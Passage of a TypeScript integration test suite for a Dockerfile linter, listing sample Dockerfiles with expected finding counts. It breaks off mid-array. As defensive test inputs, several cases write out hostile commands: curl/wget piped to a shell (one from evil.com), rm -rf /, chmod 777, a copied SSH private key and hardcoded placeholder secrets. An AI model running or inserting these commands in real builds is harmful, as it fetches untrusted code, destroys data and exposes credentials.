/**
 * Dockerfile Linter 全面集成测试 - 100个测试案例
 *
 * 运行方式: npm run test:integration
 */

import { lintDockerfile } from '../src/linter'

interface TestCase {
  id: number
  name: string
  category: string
  dockerfile: string
  expectedErrors: number
  expectedWarnings: number
  expectedInfos: number
  expectedSecurity: number
}

const testCases: TestCase[] = [
  {
    id: 1,
    name: 'F001: 缺少 FROM 指令',
    category: 'FROM',
    dockerfile: `# 缺少 FROM
WORKDIR /app
RUN npm install`,
    expectedErrors: 1,
    expectedWarnings: 0,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 2,
    name: 'F002: FROM 位置错误 - WORKDIR 在 FROM 之前',
    category: 'FROM',
    dockerfile: `WORKDIR /app
FROM node:18-alpine
COPY . .`,
    expectedErrors: 1,
    expectedWarnings: 0,
    expectedInfos: 3,
    expectedSecurity: 0,
  },
  {
    id: 3,
    name: 'F002: FROM 位置正确 - ARG 在 FROM 之前允许',
    category: 'FROM',
    dockerfile: `ARG BASE_IMAGE=node:18-alpine
FROM \${BASE_IMAGE}
WORKDIR /app`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 4,
    name: 'F003: FROM 缺少镜像名',
    category: 'FROM',
    dockerfile: `FROM
WORKDIR /app`,
    expectedErrors: 1,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 5,
    name: 'F004: 使用 latest 标签',
    category: 'FROM',
    dockerfile: `FROM node:latest
WORKDIR /app
CMD ["node", "app.js"]`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 6,
    name: 'F004: 无标签默认 latest',
    category: 'FROM',
    dockerfile: `FROM ubuntu
CMD ["bash"]`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 7,
    name: 'F004: 使用 digest 无 latest 警告',
    category: 'FROM',
    dockerfile: `FROM node@sha256:abc123
WORKDIR /app
CMD ["node"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 8,
    name: 'F005: 镜像名使用变量',
    category: 'FROM',
    dockerfile: `ARG BASE_IMAGE
FROM \${BASE_IMAGE}
WORKDIR /app
CMD ["node"]`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 9,
    name: 'F006: stage 别名重复',
    category: 'FROM',
    dockerfile: `FROM node:18-alpine AS builder
WORKDIR /app

FROM alpine:3.18 AS builder
COPY --from=builder /app /app`,
    expectedErrors: 2,
    expectedWarnings: 2,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 10,
    name: 'FROM: 正确的多阶段构建',
    category: 'FROM',
    dockerfile: `FROM node:18-alpine AS builder
WORKDIR /app
RUN npm install

FROM node:18-alpine AS runner
WORKDIR /app
COPY --from=builder /app/node_modules ./node_modules
USER node
CMD ["node", "server.js"]`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 11,
    name: 'C001: CMD JSON 数组使用单引号',
    category: 'CMD',
    dockerfile: `FROM node:18-alpine
CMD ['node', 'server.js']`,
    expectedErrors: 1,
    expectedWarnings: 1,
    expectedInfos: 1,
    expectedSecurity: 0,
  },
  {
    id: 12,
    name: 'C001: ENTRYPOINT JSON 数组使用单引号',
    category: 'ENTRYPOINT',
    dockerfile: `FROM node:18-alpine
ENTRYPOINT ['node', 'server.js']`,
    expectedErrors: 1,
    expectedWarnings: 1,
    expectedInfos: 1,
    expectedSecurity: 0,
  },
  {
    id: 13,
    name: 'C002: CMD JSON 数组括号不匹配',
    category: 'CMD',
    dockerfile: `FROM node:18-alpine
CMD ["node", "server.js"`,
    expectedErrors: 1,
    expectedWarnings: 1,
    expectedInfos: 1,
    expectedSecurity: 0,
  },
  {
    id: 14,
    name: 'C002: CMD JSON 数组双引号不匹配',
    category: 'CMD',
    dockerfile: `FROM node:18-alpine
CMD ["node", "server.js"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 1,
    expectedSecurity: 0,
  },
  {
    id: 15,
    name: 'C003: CMD 使用 shell 格式',
    category: 'CMD',
    dockerfile: `FROM node:18-alpine
CMD node server.js`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 1,
    expectedSecurity: 0,
  },
  {
    id: 16,
    name: 'C003: ENTRYPOINT 使用 shell 格式',
    category: 'ENTRYPOINT',
    dockerfile: `FROM node:18-alpine
ENTRYPOINT node server.js`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 1,
    expectedSecurity: 0,
  },
  {
    id: 17,
    name: 'C004: 多个 CMD 指令',
    category: 'CMD',
    dockerfile: `FROM node:18-alpine
CMD ["node", "server.js"]
CMD ["npm", "start"]
CMD ["bash"]`,
    expectedErrors: 0,
    expectedWarnings: 3,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 18,
    name: 'C004: 多个 ENTRYPOINT 指令',
    category: 'ENTRYPOINT',
    dockerfile: `FROM node:18-alpine
ENTRYPOINT ["node"]
ENTRYPOINT ["bash"]
CMD ["server.js"]`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 1,
    expectedSecurity: 0,
  },
  {
    id: 19,
    name: 'C006: CMD + ENTRYPOINT 组合语义错误',
    category: 'CMD+ENTRYPOINT',
    dockerfile: `FROM node:18-alpine
ENTRYPOINT ["node"]
CMD ["npm", "start"]`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 1,
    expectedSecurity: 0,
  },
  {
    id: 20,
    name: 'C006: CMD + ENTRYPOINT 正确组合',
    category: 'CMD+ENTRYPOINT',
    dockerfile: `FROM node:18-alpine
ENTRYPOINT ["node"]
CMD ["server.js"]
USER node`,
    expectedErrors: 0,
    expectedWarnings: 0,
    expectedInfos: 1,
    expectedSecurity: 0,
  },
  {
    id: 21,
    name: 'C007: ENTRYPOINT shell form + CMD exec form',
    category: 'CMD+ENTRYPOINT',
    dockerfile: `FROM node:18-alpine
ENTRYPOINT node server.js
CMD ["--port", "3000"]`,
    expectedErrors: 0,
    expectedWarnings: 3,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 22,
    name: 'CP001: COPY 缺少路径参数',
    category: 'COPY',
    dockerfile: `FROM node:18-alpine
COPY .`,
    expectedErrors: 1,
    expectedWarnings: 0,
    expectedInfos: 2,
    expectedSecurity: 0,
  },
  {
    id: 23,
    name: 'CP001: ADD 缺少路径参数',
    category: 'ADD',
    dockerfile: `FROM node:18-alpine
ADD package.json`,
    expectedErrors: 1,
    expectedWarnings: 0,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 24,
    name: 'CP002: ADD 远程 URL',
    category: 'ADD',
    dockerfile: `FROM ubuntu:20.04
ADD https://example.com/file.tar.gz /tmp/
CMD ["bash"]`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 25,
    name: 'CP003: COPY --from 引用不存在的阶段',
    category: 'COPY',
    dockerfile: `FROM ubuntu:22.04
COPY --from=builder /app/main /main
CMD ["/main"]`,
    expectedErrors: 1,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 26,
    name: 'CP003: COPY --from 自引用错误',
    category: 'COPY',
    dockerfile: `FROM node:18-alpine AS builder
WORKDIR /app
COPY --from=builder /app . .
CMD ["node"]`,
    expectedErrors: 1,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 27,
    name: 'CP003: COPY --from 引用外部镜像（info）',
    category: 'COPY',
    dockerfile: `FROM alpine:3.18
COPY --from=node:18-alpine /usr/local/bin/node /usr/local/bin/
CMD ["node"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 1,
    expectedSecurity: 0,
  },
  {
    id: 28,
    name: 'CP004: 复制敏感文件 .env',
    category: 'COPY',
    dockerfile: `FROM node:18-alpine
COPY .env /app/.env
CMD ["node", "app.js"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 29,
    name: 'CP004: 复制敏感文件 id_rsa',
    category: 'COPY',
    dockerfile: `FROM node:18-alpine
COPY id_rsa /root/.ssh/id_rsa
CMD ["node", "app.js"]`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 0,
    expectedSecurity: 1,
  },
  {
    id: 30,
    name: 'CP005: COPY . . 过宽复制',
    category: 'COPY',
    dockerfile: `FROM node:18-alpine
COPY . .
RUN npm install
CMD ["node", "app.js"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 3,
    expectedSecurity: 0,
  },
  {
    id: 31,
    name: 'CP006: USER 后 COPY 缺少 --chown',
    category: 'COPY',
    dockerfile: `FROM node:18-alpine
WORKDIR /app
USER node
COPY . .
CMD ["node", "server.js"]`,
    expectedErrors: 0,
    expectedWarnings: 0,
    expectedInfos: 4,
    expectedSecurity: 0,
  },
  {
    id: 32,
    name: 'CP006: COPY 使用 --chown 正确',
    category: 'COPY',
    dockerfile: `FROM node:18-alpine
WORKDIR /app
COPY --chown=node:node . .
USER node
CMD ["node", "server.js"]`,
    expectedErrors: 0,
    expectedWarnings: 0,
    expectedInfos: 3,
    expectedSecurity: 0,
  },
  {
    id: 33,
    name: 'R001: curl | bash 远程管道执行',
    category: 'RUN',
    dockerfile: `FROM alpine:3.18
RUN curl -sSL https://example.com/install.sh | bash
CMD ["sh"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 34,
    name: 'R001: wget | sh 远程管道执行',
    category: 'RUN',
    dockerfile: `FROM alpine:3.18
RUN wget -qO- https://example.com/install.sh | sh
CMD ["sh"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 35,
    name: 'R002: sudo 使用',
    category: 'RUN',
    dockerfile: `FROM ubuntu:20.04
RUN apt-get update && sudo apt-get install -y curl
CMD ["bash"]`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 1,
    expectedSecurity: 0,
  },
  {
    id: 36,
    name: 'R003: apt-get update 单独运行',
    category: 'RUN',
    dockerfile: `FROM ubuntu:20.04
RUN apt-get update
RUN apt-get install curl
CMD ["bash"]`,
    expectedErrors: 0,
    expectedWarnings: 3,
    expectedInfos: 2,
    expectedSecurity: 0,
  },
  {
    id: 37,
    name: 'R003: apt-get update 和 install 合并正确',
    category: 'RUN',
    dockerfile: `FROM ubuntu:20.04
RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*
CMD ["bash"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 38,
    name: 'R004: apt-get install 未清理缓存',
    category: 'RUN',
    dockerfile: `FROM ubuntu:20.04
RUN apt-get update && apt-get install -y curl
CMD ["bash"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 1,
    expectedSecurity: 0,
  },
  {
    id: 39,
    name: 'R005: apt-get install 缺少 -y',
    category: 'RUN',
    dockerfile: `FROM ubuntu:20.04
RUN apt-get update && apt-get install curl
CMD ["bash"]`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 1,
    expectedSecurity: 0,
  },
  {
    id: 40,
    name: 'R006: apk add 缺少 --no-cache',
    category: 'RUN',
    dockerfile: `FROM alpine:3.18
RUN apk add curl
CMD ["sh"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 1,
    expectedSecurity: 0,
  },
  {
    id: 41,
    name: 'R006: apk add 使用 --no-cache 正确',
    category: 'RUN',
    dockerfile: `FROM alpine:3.18
RUN apk add --no-cache curl
CMD ["curl"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 42,
    name: 'R007: rm -rf / 危险删除',
    category: 'RUN',
    dockerfile: `FROM alpine:3.18
RUN rm -rf /
CMD ["sh"]`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 43,
    name: 'R007: rm -rf /* 危险删除',
    category: 'RUN',
    dockerfile: `FROM alpine:3.18
RUN rm -rf /*
CMD ["sh"]`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 44,
    name: 'R008: chmod 777 权限过宽',
    category: 'RUN',
    dockerfile: `FROM alpine:3.18
RUN chmod 777 /app
CMD ["sh"]`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 45,
    name: 'R009: cd 命令应使用 WORKDIR',
    category: 'RUN',
    dockerfile: `FROM node:18-alpine
RUN cd /app && npm install
CMD ["node", "app.js"]`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 46,
    name: 'R010: yum install 缺少 -y',
    category: 'RUN',
    dockerfile: `FROM centos:7
RUN yum install curl
CMD ["bash"]`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 1,
    expectedSecurity: 0,
  },
  {
    id: 47,
    name: 'R011: yum install 未清理缓存',
    category: 'RUN',
    dockerfile: `FROM centos:7
RUN yum install -y curl
CMD ["bash"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 1,
    expectedSecurity: 0,
  },
  {
    id: 48,
    name: 'R012: dnf install 缺少 -y',
    category: 'RUN',
    dockerfile: `FROM fedora:38
RUN dnf install curl
CMD ["bash"]`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 1,
    expectedSecurity: 0,
  },
  {
    id: 49,
    name: 'E001: ENV 包含 API_KEY',
    category: 'ENV',
    dockerfile: `FROM node:18-alpine
ENV API_KEY=abc123secret
CMD ["node", "app.js"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 1,
  },
  {
    id: 50,
    name: 'E001: ENV 包含 PASSWORD',
    category: 'ENV',
    dockerfile: `FROM node:18-alpine
ENV DB_PASSWORD=mypassword
CMD ["node", "app.js"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 1,
  },
  {
    id: 51,
    name: 'E001: ENV 包含多个敏感变量',
    category: 'ENV',
    dockerfile: `FROM node:18-alpine
ENV API_KEY=abc123
ENV SECRET_TOKEN=xyz789
ENV AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
CMD ["node", "app.js"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 2,
  },
  {
    id: 52,
    name: 'E001: ENV 使用变量引用不触发',
    category: 'ENV',
    dockerfile: `FROM node:18-alpine
ENV API_KEY=\${API_KEY_VALUE}
CMD ["node", "app.js"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 53,
    name: 'E002: ENV 重复定义',
    category: 'ENV',
    dockerfile: `FROM node:18-alpine
ENV NODE_ENV=development
ENV NODE_ENV=production
CMD ["node", "app.js"]`,
    expectedErrors: 0,
    expectedWarnings: 4,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 54,
    name: 'E003: ARG 与 ENV 同名覆盖',
    category: 'ENV',
    dockerfile: `FROM node:18-alpine
ARG SECRET=default-secret
ENV SECRET=production-secret
CMD ["node", "app.js"]`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 0,
    expectedSecurity: 1,
  },
  {
    id: 55,
    name: 'A001: FROM 使用未定义的 ARG',
    category: 'ARG',
    dockerfile: `FROM node:\${NODE_VERSION}-alpine
ARG NODE_VERSION=18
CMD ["node"]`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 56,
    name: 'A001: ARG 在 FROM 前正确定义',
    category: 'ARG',
    dockerfile: `ARG NODE_VERSION=18
FROM node:\${NODE_VERSION}-alpine
CMD ["node"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 57,
    name: 'A002: ARG 跨阶段需重新定义',
    category: 'ARG',
    dockerfile: `ARG APP_VERSION=1.0

FROM node:18-alpine AS builder
RUN echo \${APP_VERSION}

FROM node:18-alpine
RUN echo \${APP_VERSION}
CMD ["node"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 58,
    name: 'A002: ARG 跨阶段正确重新定义',
    category: 'ARG',
    dockerfile: `ARG APP_VERSION=1.0

FROM node:18-alpine AS builder
ARG APP_VERSION
RUN echo \${APP_VERSION}

FROM node:18-alpine
ARG APP_VERSION
RUN echo \${APP_VERSION}
CMD ["node"]`,
    expectedErrors: 0,
    expectedWarnings: 0,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 59,
    name: 'A003: BUILD_VERSION 应使用 ARG',
    category: 'ARG',
    dockerfile: `FROM node:18-alpine
ENV BUILD_VERSION=1.0.0
RUN npm run build
CMD ["node", "app.js"]`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 60,
    name: 'EX001: EXPOSE 端口超出范围',
    category: 'EXPOSE',
    dockerfile: `FROM nginx:alpine
EXPOSE 99999`,
    expectedErrors: 1,
    expectedWarnings: 0,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 61,
    name: 'EX001: EXPOSE 端口为 0',
    category: 'EXPOSE',
    dockerfile: `FROM nginx:alpine
EXPOSE 0`,
    expectedErrors: 1,
    expectedWarnings: 0,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 62,
    name: 'EX001: EXPOSE 无效端口格式',
    category: 'EXPOSE',
    dockerfile: `FROM nginx:alpine
EXPOSE abc`,
    expectedErrors: 1,
    expectedWarnings: 0,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 63,
    name: 'EX002: EXPOSE 重复端口',
    category: 'EXPOSE',
    dockerfile: `FROM nginx:alpine
EXPOSE 80
EXPOSE 80/tcp`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 64,
    name: 'EX003: EXPOSE 无效协议',
    category: 'EXPOSE',
    dockerfile: `FROM nginx:alpine
EXPOSE 80/http`,
    expectedErrors: 1,
    expectedWarnings: 0,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 65,
    name: 'EX003: EXPOSE 协议 sctp 无效',
    category: 'EXPOSE',
    dockerfile: `FROM nginx:alpine
EXPOSE 80/sctp`,
    expectedErrors: 1,
    expectedWarnings: 0,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 66,
    name: 'EXPOSE: 正确的 TCP 和 UDP',
    category: 'EXPOSE',
    dockerfile: `FROM nginx:alpine
EXPOSE 80/tcp 443/tcp 53/udp
CMD ["nginx"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 1,
    expectedSecurity: 0,
  },
  {
    id: 67,
    name: 'S001: SHELL 非数组格式',
    category: 'SHELL',
    dockerfile: `FROM node:18-alpine
SHELL cmd /S /C
CMD ["node"]`,
    expectedErrors: 1,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 68,
    name: 'S001: SHELL 使用单引号',
    category: 'SHELL',
    dockerfile: `FROM node:18-alpine
SHELL ['cmd', '/S', '/C']
CMD ["node"]`,
    expectedErrors: 1,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 69,
    name: 'S001: SHELL 括号不匹配',
    category: 'SHELL',
    dockerfile: `FROM node:18-alpine
SHELL ["cmd", "/S", "/C"
CMD ["node"]`,
    expectedErrors: 1,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 70,
    name: 'S001: SHELL 正确格式',
    category: 'SHELL',
    dockerfile: `FROM node:18-alpine
SHELL ["cmd", "/S", "/C"]
CMD ["node"]
USER node`,
    expectedErrors: 0,
    expectedWarnings: 0,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 71,
    name: 'ST001: STOPSIGNAL 无效信号名',
    category: 'STOPSIGNAL',
    dockerfile: `FROM node:18-alpine
STOPSIGNAL INVALID
CMD ["node"]`,
    expectedErrors: 1,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 72,
    name: 'ST001: STOPSIGNAL 信号编号超出范围',
    category: 'STOPSIGNAL',
    dockerfile: `FROM node:18-alpine
STOPSIGNAL 100
CMD ["node"]`,
    expectedErrors: 1,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 73,
    name: 'ST001: STOPSIGNAL 正确信号名',
    category: 'STOPSIGNAL',
    dockerfile: `FROM node:18-alpine
STOPSIGNAL SIGTERM
CMD ["node"]
USER node`,
    expectedErrors: 0,
    expectedWarnings: 0,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 74,
    name: 'ST001: STOPSIGNAL 正确信号编号',
    category: 'STOPSIGNAL',
    dockerfile: `FROM node:18-alpine
STOPSIGNAL 15
CMD ["node"]
USER node`,
    expectedErrors: 0,
    expectedWarnings: 0,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 75,
    name: 'X002: 缺少 USER 指令',
    category: 'USER',
    dockerfile: `FROM node:18-alpine
WORKDIR /app
COPY . .
CMD ["node", "server.js"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 3,
    expectedSecurity: 0,
  },
  {
    id: 76,
    name: 'X002: USER root 最终以 root 运行',
    category: 'USER',
    dockerfile: `FROM node:18-alpine
WORKDIR /app
USER node
COPY . .
USER root
CMD ["node", "server.js"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 4,
    expectedSecurity: 0,
  },
  {
    id: 77,
    name: 'X003: 先切换普通用户后切回 root',
    category: 'USER',
    dockerfile: `FROM node:18-alpine
USER node
COPY . .
USER root
CMD ["bash"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 4,
    expectedSecurity: 0,
  },
  {
    id: 78,
    name: 'X004: COPY 在 WORKDIR 之前',
    category: 'WORKDIR',
    dockerfile: `FROM node:18-alpine
COPY . .
WORKDIR /app
CMD ["node", "server.js"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 4,
    expectedSecurity: 0,
  },
  {
    id: 79,
    name: 'X005: 长期服务缺少 HEALTHCHECK',
    category: 'HEALTHCHECK',
    dockerfile: `FROM node:18-alpine
EXPOSE 3000
CMD ["node", "server.js"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 1,
    expectedSecurity: 0,
  },
  {
    id: 80,
    name: 'X005: 有 HEALTHCHECK 不触发',
    category: 'HEALTHCHECK',
    dockerfile: `FROM node:18-alpine
EXPOSE 3000
HEALTHCHECK --interval=30s CMD curl -f http://localhost:3000/ || exit 1
CMD ["node", "server.js"]
USER node`,
    expectedErrors: 0,
    expectedWarnings: 0,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 81,
    name: 'X006: 连续 RUN 指令应合并',
    category: 'RUN',
    dockerfile: `FROM alpine:3.18
RUN apk add --no-cache curl
RUN apk add --no-cache wget
RUN rm -rf /var/cache/*
CMD ["sh"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 2,
    expectedSecurity: 0,
  },
  {
    id: 82,
    name: 'X007: 连续空行过多',
    category: 'Format',
    dockerfile: `FROM node:18-alpine



WORKDIR /app
CMD ["node"]`,
    expectedErrors: 0,
    expectedWarnings: 0,
    expectedInfos: 1,
    expectedSecurity: 0,
  },
  {
    id: 83,
    name: 'X011: 非 root 用户 COPY 权限风险',
    category: 'COPY',
    dockerfile: `FROM node:18-alpine
COPY . /app
USER node
CMD ["node", "/app/server.js"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 2,
    expectedSecurity: 0,
  },
  {
    id: 84,
    name: 'X008: Final stage 包含构建工具 gcc',
    category: 'StageResidue',
    dockerfile: `FROM node:18-alpine AS builder
RUN npm install && npm run build

FROM node:18-alpine
COPY --from=builder /app/dist /app
RUN apk add --no-cache gcc g++ make
CMD ["node", "server.js"]`,
    expectedErrors: 0,
    expectedWarnings: 0,
    expectedInfos: 0,
    expectedSecurity: 2,
  },
  {
    id: 85,
    name: 'X009: Final stage 复制敏感文件',
    category: 'StageResidue',
    dockerfile: `FROM node:18-alpine AS builder
COPY .env /app/.env
RUN npm run build

FROM node:18-alpine
COPY --from=builder /app /app
CMD ["node", "server.js"]`,
    expectedErrors: 0,
    expectedWarnings: 0,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 86,
    name: 'X010: Final stage 包含 npm 工具',
    category: 'StageResidue',
    dockerfile: `FROM node:18-alpine AS builder
RUN npm install && npm run build

FROM node:18-alpine
COPY --from=builder /app/dist /app
RUN apk add --no-cache npm
CMD ["node", "server.js"]`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 87,
    name: '组合: 多个错误同时存在',
    category: 'Combined',
    dockerfile: `FROM ubuntu:latest
ENV API_KEY=secret
RUN apt-get update
RUN apt-get install curl
COPY .env /app/
EXPOSE 99999
CMD node app.js`,
    expectedErrors: 1,
    expectedWarnings: 5,
    expectedInfos: 3,
    expectedSecurity: 1,
  },
  {
    id: 88,
    name: '组合: 多阶段构建中的多个问题',
    category: 'Combined',
    dockerfile: `FROM node:latest AS builder
WORKDIR /app
COPY . .
RUN npm install

FROM node:latest
COPY --from=nonexistent /app /app
ENV SECRET=password
CMD ['node', 'server.js']`,
    expectedErrors: 2,
    expectedWarnings: 2,
    expectedInfos: 2,
    expectedSecurity: 1,
  },
  {
    id: 89,
    name: '组合: 安全问题叠加',
    category: 'Combined',
    dockerfile: `FROM ubuntu:20.04
ENV AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
ENV DB_PASSWORD=mypassword
COPY id_rsa /root/.ssh/id_rsa
COPY .env /app/.env
RUN chmod 777 /app
RUN curl -sSL https://evil.com/install.sh | bash
CMD ["bash"]`,
    expectedErrors: 0,
    expectedWarnings: 4,
    expectedInfos: 1,
    expectedSecurity: 2,
  },
  {
    id: 90,
    name: '组合: 正确的最佳实践 Dockerfile',
    category: 'Combined',
    dockerfile: `ARG NODE_VERSION=18

FROM node:\${NODE_VERSION}-alpine AS builder
ARG NODE_VERSION
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

FROM node:\${NODE_VERSION}-alpine AS runner
ARG NODE_VERSION
WORKDIR /app
COPY --from=builder --chown=node:node /app/node_modules ./node_modules
COPY --chown=node:node . .
EXPOSE 3000
HEALTHCHECK --interval=30s CMD curl -f http://localhost:3000/ || exit 1
USER node
CMD ["node", "server.js"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 2,
    expectedSecurity: 0,
  },
  {
    id: 91,
    name: '边缘: 空 Dockerfile',
    category: 'Edge',
    dockerfile: ``,
    expectedErrors: 1,
    expectedWarnings: 0,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 92,
    name: '边缘: 只有注释',
    category: 'Edge',
    dockerfile: `# 这是一个注释
# 没有 FROM`,
    expectedErrors: 1,
    expectedWarnings: 0,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 93,
    name: '边缘: 多行 RUN 指令',
    category: 'Edge',
    dockerfile: `FROM ubuntu:20.04
RUN apt-get update &&     apt-get install -y curl wget &&     rm -rf /var/lib/apt/lists/*
CMD ["bash"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 94,
    name: '边缘: 带引号的 ENV 值',
    category: 'Edge',
    dockerfile: `FROM node:18-alpine
ENV NODE_ENV="production"
ENV PATH="/app/bin:\${PATH}"
CMD ["node", "app.js"]`,
    expectedErrors: 0,
    expectedWarnings: 2,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 95,
    name: '边缘: EXPOSE 多个端口',
    category: 'Edge',
    dockerfile: `FROM nginx:alpine
EXPOSE 80 443 8080/tcp 8443/tcp 53/udp
CMD ["nginx"]`,
    expectedErrors: 0,
    expectedWarnings: 1,
    expectedInfos: 1,
    expectedSecurity: 0,
  },
  {
    id: 96,
    name: '边缘: Windows 风格 SHELL',
    category: 'Edge',
    dockerfile: `FROM mcr.microsoft.com/windows/servercore:ltsc2022
SHELL ["powershell", "-Command"]
USER ContainerUser
CMD ["cmd"]`,
    expectedErrors: 0,
    expectedWarnings: 0,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
    id: 97,
    name: '边缘: ARG 有默认值但 ENV 同名',
    category: 'Edge',
    dockerfile: `FROM node:18-alpine
ARG VERSION=1.0
ENV VERSION=2.0
CMD ["node", "app.js"]`,
    expectedErrors: 0,
    expectedWarnings: 3,
    expectedInfos: 0,
    expectedSecurity: 0,
  },
  {
